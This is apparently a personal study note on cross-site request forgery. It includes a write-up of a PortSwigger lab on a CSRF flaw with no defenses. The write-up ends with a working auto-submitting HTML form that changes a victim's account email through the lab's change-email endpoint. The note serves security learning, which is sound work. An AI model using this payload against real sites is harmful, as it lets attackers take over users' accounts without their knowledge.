# 🥐 Cross-site request forgery (CSRF)

CSRF allows an attacker to induce users to perform actions that they do not intend to perform

<figure><img src="../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally like changing the email address on their account, changing their password, or to make a funds transfer

since we do not have burp pro, we can use this repo to create our PoC: [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator) OR [https://security.love/CSRF-PoC-Genorator/](https://security.love/CSRF-PoC-Genorator/)

### Lab: CSRF vulnerability with no defenses

We see a "update email" field:

<figure><img src="../../.gitbook/assets/image (857).png" alt=""><figcaption></figcaption></figure>

I capture the request of an email change:

<figure><img src="../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

I then go on the exploit server and write this code:

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```
